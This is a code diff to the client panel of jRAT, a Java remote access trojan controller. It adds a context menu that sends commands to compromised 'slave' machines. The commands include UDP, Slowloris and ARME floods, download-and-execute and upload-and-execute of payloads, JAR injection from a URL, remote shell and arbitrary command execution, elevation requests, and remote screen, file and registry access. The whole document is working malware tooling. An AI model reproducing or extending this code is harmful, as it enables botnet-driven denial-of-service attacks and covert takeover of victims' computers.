@@ -2,21 +2,62 @@ package se.jrat.client.ui.panels;
 
 import java.awt.Color;
 import java.awt.Component;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+import java.awt.event.MouseAdapter;
+import java.awt.event.MouseEvent;
+import java.io.File;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 
+import javax.swing.ImageIcon;
 import javax.swing.JCheckBox;
+import javax.swing.JFileChooser;
 import javax.swing.JLabel;
+import javax.swing.JMenu;
+import javax.swing.JMenuItem;
+import javax.swing.JOptionPane;
+import javax.swing.JPopupMenu;
 import javax.swing.JScrollPane;
 import javax.swing.JTable;
+import javax.swing.ListSelectionModel;
 import javax.swing.table.DefaultTableCellRenderer;
 import javax.swing.table.DefaultTableModel;
 
 import se.jrat.client.AbstractSlave;
 import se.jrat.client.Main;
+import se.jrat.client.Slave;
 import se.jrat.client.Status;
+import se.jrat.client.net.URLParser;
+import se.jrat.client.packets.outgoing.Packet100RequestElevation;
+import se.jrat.client.packets.outgoing.Packet11Disconnect;
+import se.jrat.client.packets.outgoing.Packet14VisitURL;
+import se.jrat.client.packets.outgoing.Packet17DownloadExecute;
+import se.jrat.client.packets.outgoing.Packet18Update;
+import se.jrat.client.packets.outgoing.Packet22Flood;
+import se.jrat.client.packets.outgoing.Packet36Uninstall;
+import se.jrat.client.packets.outgoing.Packet37RestartJavaProcess;
+import se.jrat.client.packets.outgoing.Packet38RunCommand;
+import se.jrat.client.packets.outgoing.Packet45Reconnect;
+import se.jrat.client.packets.outgoing.Packet98InjectJAR;
+import se.jrat.client.settings.Settings;
+import se.jrat.client.ui.dialogs.DialogFileType;
+import se.jrat.client.ui.frames.Frame;
+import se.jrat.client.ui.frames.FrameComputerInfo;
+import se.jrat.client.ui.frames.FrameControlPanel;
+import se.jrat.client.ui.frames.FrameNotes;
+import se.jrat.client.ui.frames.FrameRemoteChat;
+import se.jrat.client.ui.frames.FrameRemoteFiles;
+import se.jrat.client.ui.frames.FrameRemoteProcess;
+import se.jrat.client.ui.frames.FrameRemoteRegistry;
+import se.jrat.client.ui.frames.FrameRemoteScreen;
+import se.jrat.client.ui.frames.FrameRemoteShell;
+import se.jrat.client.ui.frames.FrameRename;
 import se.jrat.client.utils.IconUtils;
+import se.jrat.client.utils.Utils;
+import se.jrat.common.Flood;
+import se.jrat.common.downloadable.Downloadable;
 
 @SuppressWarnings("serial")
 public class PanelMainClients extends JScrollPane {
@@ -55,7 +96,34 @@ public class PanelMainClients extends JScrollPane {
 		model = new ClientsTableModel();
 		table = new JTable(model);
 		table.setDefaultRenderer(Object.class, new ClientsTableRenderer());
-		table.setRowHeight(30);
+		table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
+		table.addMouseListener(new MouseAdapter() {
+			public void mouseClicked(MouseEvent e) {
+				int row = table.getSelectedRow();
+				int column = table.getSelectedColumn();
+
+				if (row != -1 && table.getColumnName(column).equals(COLUMN_COUNTRY)) {
+					AbstractSlave sl = getSlave(row);
+					sl.setSelected(!sl.isSelected());
+					ListSelectionModel selectionModel = table.getSelectionModel();
+					selectionModel.removeSelectionInterval(row, row);
+				}
+			}
+		});
+		
+		int rowheight = 30;
+		
+		try {
+			Object rowHeight = Settings.getGlobal().get("rowheight");
+			if (rowHeight != null) {
+				rowheight = Integer.parseInt(rowHeight.toString());
+			}
+		} catch (Exception ex) {
+			ex.printStackTrace();
+		}
+		table.setRowHeight(rowheight);
+		
+		Utils.addPopup(table, getPopupMenu());
 		
 		setViewportView(table);
 	}
@@ -64,6 +132,37 @@ public class PanelMainClients extends JScrollPane {
 		model.addRow(new Object[] { slave });
 	}
 
+	public AbstractSlave getSlave(int row) {
+		AbstractSlave slave = null;
+		
+		for (int i = 0; i < table.getColumnCount(); i++) {
+			Object obj = table.getValueAt(row, i);
+			if (obj instanceof AbstractSlave) {
+				slave = (AbstractSlave) obj;
+				break;
+			}
+		}
+		
+		return slave;
+	}
+	
+	public List<AbstractSlave> getSelectedSlaves() {
+		List<AbstractSlave> list = new ArrayList<AbstractSlave>();
+		for (int i = 0; i < model.getRowCount(); i++) {
+			AbstractSlave slave = getSlave(i);
+			
+			if (slave.isSelected() || table.isRowSelected(i)) {
+				list.add(slave);
+			}
+		}
+		return list;
+	}
+	
+	public AbstractSlave getSelectedSlave() {
+		int row = table.getSelectedRow();
+		return getSlave(row);
+	}
+	
 	public class ClientsTableRenderer extends DefaultTableCellRenderer {
 		@Override
 		public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
@@ -77,15 +176,7 @@ public class PanelMainClients extends JScrollPane {
 				label.setBackground(Color.white);
 			}
 			
-			AbstractSlave slave = null;
-						
-			for (int i = 0; i < table.getColumnCount(); i++) {
-				Object obj = table.getValueAt(row, i);
-				if (obj instanceof AbstractSlave) {
-					slave = (AbstractSlave) obj;
-					break;
-				}
-			}
+			AbstractSlave slave = getSlave(row);
 
 			if (slave != null) {
 				
@@ -174,7 +265,675 @@ public class PanelMainClients extends JScrollPane {
 		public boolean isCellEditable(int i, int i1) {
 			return false;
 		}
+		
+		@Override
+		public Class<?> getColumnClass(int column) {
+			if (table.getColumnName(column).equals(COLUMN_COUNTRY) && Frame.thumbnails) {
+				return ImageIcon.class;
+			}
+			
+			return super.getColumnClass(column);
+		}
+	}
+	
+	public JPopupMenu getPopupMenu() {
+		JPopupMenu popupMenu = new JPopupMenu();
+		
+		JMenuItem mntmControlPanel = new JMenuItem("Control Panel                       ");
+		mntmControlPanel.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				AbstractSlave slave = getSelectedSlave();
+				if (slave != null && slave instanceof Slave) {
+					FrameControlPanel screen = new FrameControlPanel((Slave) slave);
+					screen.setVisible(true);
+				}
+			}
+		});
+		mntmControlPanel.setIcon(IconUtils.getIcon("controlpanel"));
 
+		popupMenu.add(mntmControlPanel);
+		popupMenu.addSeparator();
+
+		JMenu mnNetworking = new JMenu("Networking");
+		mnNetworking.setIcon(IconUtils.getIcon("process"));
+		popupMenu.add(mnNetworking);
+
+		JMenu mnStressing = new JMenu("Stressing");
+		mnStressing.setIcon(IconUtils.getIcon("firewall"));
+		mnNetworking.add(mnStressing);
+
+		JMenuItem mntmUdpFlood = new JMenuItem("UDP");
+		mnStressing.add(mntmUdpFlood);
+		mntmUdpFlood.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				String target = Utils.showDialog("UDP flood", "Enter IP:Port to flood");
+				if (target == null) {
+					return;
+				}
+				try {
+					String[] targetargs = target.split(":");
+					Integer.parseInt(targetargs[1]);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				String time = Utils.showDialog("UDP flood", "Enter seconds to flood");
+				if (time == null) {
+					return;
+				}
+				int time1;
+				try {
+					time1 = Integer.parseInt(time);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					for (AbstractSlave sl : servers) {
+						if (sl instanceof Slave) {
+							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.UDP, target, time1));
+						}
+					}
+				}
+			}
+		});
+		mntmUdpFlood.setIcon(null);
+
+		JMenuItem mntmMassDownloadFlood = new JMenuItem("Mass download");
+		mnStressing.add(mntmMassDownloadFlood);
+		mntmMassDownloadFlood.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				String target = Utils.showDialog("Mass download flood", "Enter website URL to download");
+				if (target == null) {
+					return;
+				}
+
+				String time = Utils.showDialog("Mass download flood", "Enter seconds to download");
+				if (time == null) {
+					return;
+				}
+				int time1;
+				try {
+					time1 = Integer.parseInt(time);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					for (AbstractSlave sl : servers) {
+						if (sl instanceof Slave) {
+							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.DRAIN, target, time1));
+						}
+					}
+				}
+			}
+		});
+		mntmMassDownloadFlood.setIcon(null);
+
+		JMenuItem mntmArme = new JMenuItem("ARME");
+		mnStressing.add(mntmArme);
+		mntmArme.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				String target = Utils.showDialog("ARME flood", "Enter Host:Port/IP:Port to flood");
+				if (target == null) {
+					return;
+				}
+				try {
+					String[] targetargs = target.split(":");
+					Integer.parseInt(targetargs[1]);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				String time = Utils.showDialog("ARME flood", "Enter seconds to flood");
+				if (time == null) {
+					return;
+				}
+				int time1;
+				try {
+					time1 = Integer.parseInt(time);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					for (AbstractSlave sl : servers) {
+						if (sl instanceof Slave) {
+							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.ARME, target, time1));
+						}
+					}
+				}
+			}
+		});
+		mntmArme.setIcon(null);
+
+		JMenuItem mntmSlowloris = new JMenuItem("Slowloris");
+		mntmSlowloris.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				String target = Utils.showDialog("Slowloris flood", "Enter Host:Port/IP:Port to flood");
+				if (target == null) {
+					return;
+				}
+				try {
+					String[] targetargs = target.split(":");
+					Integer.parseInt(targetargs[1]);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid IP:Port!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				String time = Utils.showDialog("Slowloris flood", "Enter seconds to flood");
+				if (time == null) {
+					return;
+				}
+				int time1;
+				try {
+					time1 = Integer.parseInt(time);
+				} catch (Exception ex) {
+					JOptionPane.showMessageDialog(null, "Enter valid seconds as number!", "Error", JOptionPane.ERROR_MESSAGE);
+					return;
+				}
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					for (AbstractSlave sl : servers) {
+						if (sl instanceof Slave) {
+							((Slave)sl).addToSendQueue(new Packet22Flood(Flood.SLOWLORIS, target, time1));
+						}
+					}
+				}
+			}
+		});
+		mnStressing.add(mntmSlowloris);
+
+		mnNetworking.addSeparator();
+
+		JMenuItem mntmexe = new JMenuItem("Download and Execute");
+		mnNetworking.add(mntmexe);
+		mntmexe.setIcon(IconUtils.getIcon("arrow-down"));
+
+		JMenuItem mntmUploadAndExecute = new JMenuItem("Upload and Execute");
+		mntmUploadAndExecute.setIcon(IconUtils.getIcon("drive-upload"));
+		mntmUploadAndExecute.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					JFileChooser f = new JFileChooser();
+					f.showOpenDialog(null);
+
+					File file = f.getSelectedFile();
+
+					if (file == null) {
+						return;
+					}
+
+					for (AbstractSlave slave : servers) {
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet17DownloadExecute("", Downloadable.getFileExtension(file.getName()), file));
+						}
+					}
+				}
+			}
+		});
+		mnNetworking.add(mntmUploadAndExecute);
+
+		mnNetworking.addSeparator();
+
+		JMenuItem mntmUpdateFromUrl = new JMenuItem("Update from URL");
+		mnNetworking.add(mntmUpdateFromUrl);
+		mntmUpdateFromUrl.setIcon(IconUtils.getIcon("update"));
+
+		JMenuItem mntmUpdateFromFile = new JMenuItem("Update from File");
+		mntmUpdateFromFile.setIcon(IconUtils.getIcon("drive-upload"));
+		mntmUpdateFromFile.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					JFileChooser f = new JFileChooser();
+					f.showOpenDialog(null);
+
+					File file = f.getSelectedFile();
+
+					if (file == null) {
+						return;
+					}
+
+					for (AbstractSlave slave : servers) {
+						
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet18Update(file));
+						}
+					}
+				}
+			}
+		});
+		mnNetworking.add(mntmUpdateFromFile);
+
+		mnNetworking.addSeparator();
+
+		JMenuItem mntmHost = new JMenuItem("Host");
+		mnNetworking.add(mntmHost);
+		mntmHost.setIcon(IconUtils.getIcon("computer"));
+		mntmHost.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				AbstractSlave slave = getSelectedSlave();
+				if (slave != null) {
+					JOptionPane.showMessageDialog(null, slave.getHost(), "Host - " + slave.getIP(), JOptionPane.INFORMATION_MESSAGE);
+				}
+			}
+		});
+		mntmUpdateFromUrl.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					String result = Utils.showDialog("Update from URL", "Input URL to update with");
+					if (result == null) {
+						return;
+					}
+					try {
+						URLParser.parse(result);
+					} catch (Exception ex) {
+						JOptionPane.showMessageDialog(null, "Input valid URL!", "Update from URL", JOptionPane.ERROR_MESSAGE);
+						return;
+					}
+
+					result = result.trim().replace(" ", "%20");
+
+					for (AbstractSlave sl : servers) {
+						if (sl instanceof Slave) {
+							((Slave)sl).addToSendQueue(new Packet18Update(result));
+						}
+					}
+				}
+			}
+		});
+		mntmexe.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					String result = Utils.showDialog("Download and Execute", "Input URL to download and execute");
+					if (result == null) {
+						return;
+					}
+
+					try {
+						URLParser.parse(result);
+					} catch (Exception ex) {
+						JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
+						return;
+					}
+
+					result = result.trim().replace(" ", "%20");
+
+					String filetype = DialogFileType.showDialog();
+
+					if (filetype == null) {
+						return;
+					}
+
+					for (AbstractSlave slave : servers) {
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet17DownloadExecute(result, filetype));
+						}
+					}
+				}
+			}
+		});
+
+		JMenu mnQuickOpen = new JMenu("Quick Open");
+		mnQuickOpen.setIcon(IconUtils.getIcon("application-import"));
+		popupMenu.add(mnQuickOpen);
+
+		JMenuItem mntmRemoteScreen = new JMenuItem("Remote Screen");
+		mntmRemoteScreen.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				AbstractSlave slave = getSelectedSlave();
+				if (slave != null && slave instanceof Slave) {
+					FrameRemoteScreen.show((Slave) slave);
+				}
+			}
+		});
+
+		JMenuItem mntmVisitUrl = new JMenuItem("Visit URL");
+		mnQuickOpen.add(mntmVisitUrl);
+		mntmVisitUrl.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					String result = Utils.showDialog("Visit URL", "Input URL to visit");
+					if (result != null && !result.startsWith("http://")) {
+						result = "http://" + result;
+					}
+					if (result == null) {
+						return;
+					}
+
+					if (!result.startsWith("http://")) {
+						JOptionPane.showMessageDialog(null, "Input valid URL!", "Visit URL", JOptionPane.ERROR_MESSAGE);
+						return;
+					}
+
+					result = result.trim();
+
+					for (AbstractSlave slave : servers) {
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet14VisitURL(result));
+						}
+					}
+				}
+
+			}
+		});
+		mntmVisitUrl.setIcon(IconUtils.getIcon("application-browser"));
+		mntmRemoteScreen.setIcon(IconUtils.getIcon("screen"));
+		mnQuickOpen.add(mntmRemoteScreen);
+
+		JMenuItem mntmFileManager = new JMenuItem("File Manager");
+		mntmFileManager.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				AbstractSlave slave = getSelectedSlave();
+				if (slave != null && slave instanceof Slave) {
+					FrameRemoteFiles frame = new FrameRemoteFiles((Slave) slave);
+					frame.setVisible(true);
+				}
+			}
+		});
+
+		JMenuItem mntmRemoteRegistry = new JMenuItem("Remote Registry");
+		mntmRemoteRegistry.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				AbstractSlave slave = getSelectedSlave();
+				if (slave != null && slave instanceof Slave) {
+					FrameRemoteRegistry frame = new FrameRemoteRegistry((Slave) slave);
+					frame.setVisible(true);
+				}
+			}
+		});
+		mntmRemoteRegistry.setIcon(IconUtils.getIcon("registry"));
+		mnQuickOpen.add(mntmRemoteRegistry);
+		mntmFileManager.setIcon(IconUtils.getIcon("folder-go"));
+		mnQuickOpen.add(mntmFileManager);
+
+		JMenuItem mntmRemoteCmd = new JMenuItem("Remote Terminal");
+		mntmRemoteCmd.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				AbstractSlave slave = getSelectedSlave();
+				if (slave != null && slave instanceof Slave) {
+					FrameRemoteShell frame = new FrameRemoteShell((Slave) slave);
+					frame.setVisible(true);
+				}
+			}
+		});
+		mntmRemoteCmd.setIcon(IconUtils.getIcon("terminal"));
+		mnQuickOpen.add(mntmRemoteCmd);
+
+		JMenuItem mntmRemoteChat = new JMenuItem("Remote Chat");
+		mntmRemoteChat.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				AbstractSlave slave = getSelectedSlave();
+				if (slave != null && slave instanceof Slave) {
+					FrameRemoteChat frame = new FrameRemoteChat((Slave) slave);
+					frame.setVisible(true);
+				}
+			}
+		});
+
+		JMenuItem mntmRemoteProcess = new JMenuItem("Remote Process");
+		mntmRemoteProcess.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				AbstractSlave slave = getSelectedSlave();
+				if (slave != null && slave instanceof Slave) {
+					FrameRemoteProcess frame = new FrameRemoteProcess((Slave) slave);
+					frame.setVisible(true);
+				}
+			}
+		});
+		mntmRemoteProcess.setIcon(IconUtils.getIcon("process-go"));
+		mnQuickOpen.add(mntmRemoteProcess);
+		mntmRemoteChat.setIcon(IconUtils.getIcon("chat"));
+		mnQuickOpen.add(mntmRemoteChat);
+
+		JMenuItem mntmNotes = new JMenuItem("Notes");
+		mntmNotes.setIcon(IconUtils.getIcon("notes"));
+		mntmNotes.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				AbstractSlave slave = getSelectedSlave();
+				if (slave != null && slave instanceof Slave) {
+					FrameNotes frame = new FrameNotes((Slave) slave);
+					frame.setVisible(true);
+				}
+			}
+		});
+		mnQuickOpen.add(mntmNotes);
+		
+		JMenu mnTools_1 = new JMenu("Tools");
+		mnTools_1.setIcon(IconUtils.getIcon("toolbox"));
+		popupMenu.add(mnTools_1);
+		
+				JMenuItem mntmRunCommand = new JMenuItem("Run Command");
+				mnTools_1.add(mntmRunCommand);
+				mntmRunCommand.addActionListener(new ActionListener() {
+					public void actionPerformed(ActionEvent arg0) {
+						List<AbstractSlave> servers = getSelectedSlaves();
+						if (servers.size() > 0) {
+							String process = Utils.showDialog("Run Command", "Select command to send to connections");
+							if (process == null) {
+								return;
+							}
+
+							for (AbstractSlave slave : servers) {
+								if (slave instanceof Slave) {
+									((Slave)slave).addToSendQueue(new Packet38RunCommand(process));
+								}
+							}
+						}
+					}
+				});
+				mntmRunCommand.setIcon(IconUtils.getIcon("execute"));
+
+		JMenu mnInject = new JMenu("Inject JAR");
+		mnTools_1.add(mnInject);
+		mnInject.setIcon(IconUtils.getIcon("inject"));
+
+		JMenuItem mntmInjectFromUrl = new JMenuItem("Inject from URL");
+		mntmInjectFromUrl.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					String url;
+
+					url = Utils.showDialog("Inject from URL", "Type file URL");
+
+					if (url == null || url != null && url.length() == 0) {
+						return;
+					}
+
+					String mainClass;
+
+					mainClass = Utils.showDialog("Inject from URL", "Type the JAR file entry point class name");
+
+					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
+						return;
+					}
+
+					for (AbstractSlave slave : servers) {
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet98InjectJAR(url, mainClass));
+						}
+					}
+				}
+			}
+		});
+		mntmInjectFromUrl.setIcon(IconUtils.getIcon("arrow-down"));
+		mnInject.add(mntmInjectFromUrl);
+
+		JMenuItem mntmInjectFromFile = new JMenuItem("Inject from file");
+		mntmInjectFromFile.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent e) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					JFileChooser f = new JFileChooser();
+					f.showOpenDialog(null);
+
+					File file = f.getSelectedFile();
+
+					if (file == null) {
+						return;
+					}
+
+					String mainClass;
+
+					mainClass = Utils.showDialog("Inject from File", "Type the JAR file entry point class name");
+
+					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
+						return;
+					}
+
+					for (AbstractSlave slave : servers) {
+						if (slave instanceof Slave) {
+							((Slave)slave).addToSendQueue(new Packet98InjectJAR(file, mainClass));
+						}
+					}
+				}
+			}
+		});
+		mntmInjectFromFile.setIcon(IconUtils.getIcon("drive-upload"));
+		mnInject.add(mntmInjectFromFile);
+		
+		JMenuItem mntmRequestElevation = new JMenuItem("Request Elevation");
+		mntmRequestElevation.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+
+				for (AbstractSlave slave : servers) {
+					if (slave instanceof Slave) {
+						((Slave)slave).addToSendQueue(new Packet100RequestElevation());
+					}
+				}
+			}
+		});
+		mntmRequestElevation.setIcon(IconUtils.getIcon("shield"));
+		mnTools_1.add(mntmRequestElevation);
+		popupMenu.addSeparator();
+
+		JMenuItem mntmInfo = new JMenuItem("Info");
+		mntmInfo.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				AbstractSlave slave = getSelectedSlave();
+				if (slave != null && slave instanceof Slave) {
+					FrameComputerInfo screen = new FrameComputerInfo((Slave) slave);
+					screen.setVisible(true);
+				}
+			}
+		});
+		mntmInfo.setIcon(IconUtils.getIcon("info"));
+		popupMenu.add(mntmInfo);
+
+		JMenuItem mntmForceDisconnect = new JMenuItem("Disconnect");
+		mntmForceDisconnect.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					if (Utils.yesNo("Confirm", "Confirm disconnecting " + servers.size() + " connections")) {
+						for (AbstractSlave sl : servers) {
+							try {
+								if (sl instanceof Slave) {
+									((Slave)sl).addToSendQueue(new Packet11Disconnect());
+								}
+							} catch (Exception ex) {
+								ex.printStackTrace();
+							}
+						}
+					}
+				}
+			}
+		});
+
+		JMenuItem mntmRestart = new JMenuItem("Restart");
+		mntmRestart.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					if (Utils.yesNo("Confirm", "Confirm restarting " + servers.size() + " connections")) {
+						for (AbstractSlave sl : servers) {
+							try {
+								if (sl instanceof Slave) {
+									((Slave)sl).addToSendQueue(new Packet37RestartJavaProcess());
+								}
+							} catch (Exception ex) {
+								ex.printStackTrace();
+							}
+						}
+					}
+				}
+			}
+		});
+
+		JMenuItem mntmRename = new JMenuItem("Rename");
+		mntmRename.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				AbstractSlave slave = getSelectedSlave();
+				if (slave != null) {
+					FrameRename screen = new FrameRename(slave);
+					screen.setVisible(true);
+				}
+			}
+		});
+		mntmRename.setIcon(IconUtils.getIcon("rename"));
+		popupMenu.add(mntmRename);
+		popupMenu.addSeparator();
+		mntmRestart.setIcon(IconUtils.getIcon("refresh"));
+		popupMenu.add(mntmRestart);
+
+		JMenuItem mntmRestartConnection = new JMenuItem("Reconnect");
+		mntmRestartConnection.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					if (Utils.yesNo("Confirm", "Confirm reconnect " + servers.size() + " connections")) {
+						for (AbstractSlave sl : servers) {
+							try {
+								if (sl instanceof Slave) {
+									((Slave)sl).addToSendQueue(new Packet45Reconnect());
+								}
+							} catch (Exception ex) {
+								ex.printStackTrace();
+							}
+						}
+					}
+				}
+			}
+		});
+		mntmRestartConnection.setIcon(IconUtils.getIcon("refresh-blue"));
+		popupMenu.add(mntmRestartConnection);
+		mntmForceDisconnect.setIcon(IconUtils.getIcon("delete"));
+		popupMenu.add(mntmForceDisconnect);
+
+		JMenuItem mntmUninstall = new JMenuItem("Uninstall");
+		mntmUninstall.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = getSelectedSlaves();
+				if (servers.size() > 0) {
+					if (Utils.yesNo("Confirm", "Confirm uninstalling " + servers.size() + " connections")) {
+						for (AbstractSlave sl : servers) {
+							try {
+								if (sl instanceof Slave) {
+									((Slave)sl).addToSendQueue(new Packet36Uninstall());
+								}
+							} catch (Exception ex) {
+								ex.printStackTrace();
+							}
+						}
+					}
+				}
+			}
+		});
+
+		mntmUninstall.setIcon(IconUtils.getIcon("exit"));
+		popupMenu.add(mntmUninstall);
+		
+		return popupMenu;
 	}
 
 }
